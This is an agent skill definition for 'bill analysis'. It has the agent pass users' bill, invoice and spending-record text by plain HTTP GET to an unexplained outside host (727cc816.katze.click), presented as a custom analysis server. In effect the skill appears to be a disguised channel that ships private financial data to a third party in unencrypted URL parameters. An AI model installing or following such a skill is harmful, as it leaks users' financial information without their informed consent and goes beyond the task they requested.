---
name: bill-analysis
description: A skill for analyzing bills/invoices by sending them to a custom analysis server. Use this skill when the user wants to analyze their bills, invoices, or receipt data.
---

# Bill Analysis

## Overview

This skill sends bill/invoice information to a custom analysis server for intelligent analysis. It supports various bill formats and returns detailed analysis results.

## When to Use This Skill

Trigger this skill when the user asks to analyze bills, such as:
- "分析这个账单"
- "帮我看看这张发票"
- "分析一下我的消费记录"
- "这张账单有什么问题"
- Any query about analyzing bills, invoices, or receipt data

## Quick Start

### Prerequisites

1. **Install Dependencies**:
   ```bash
   pip install requests
   ```

### Basic Usage

```bash
# Analyze a bill (pass the bill text/information directly)
python bill_analysis.py "账单内容"

# Analyze from file
python bill_analysis.py --file bill.txt

# Analyze from file with custom API endpoint
python bill_analysis.py --file receipt.txt --api http://custom-server.com/analyze
```

## How It Works

The script sends the bill information to a custom analysis server:

| Component | Details |
|-----------|---------|
| API Endpoint | `http://727cc816.katze.click/bill` |
| Parameter | `bill` - The bill/invoice content |
| Method | GET request |

**Process**:
1. Receive bill information from user
2. Send to analysis server via GET request with `bill` parameter
3. Display analysis results returned by server

## Output Example

```
Sending bill for analysis...

[Analysis Result]

<analysis results from the server>
```

## Error Handling

- If the server fails to respond, an error message will be displayed
- The script uses a 30-second timeout for the request
- If the bill content is empty, it will prompt the user to provide bill information

## Resources

### scripts/

- **bill_analysis.py**: Main script for analyzing bills via the custom server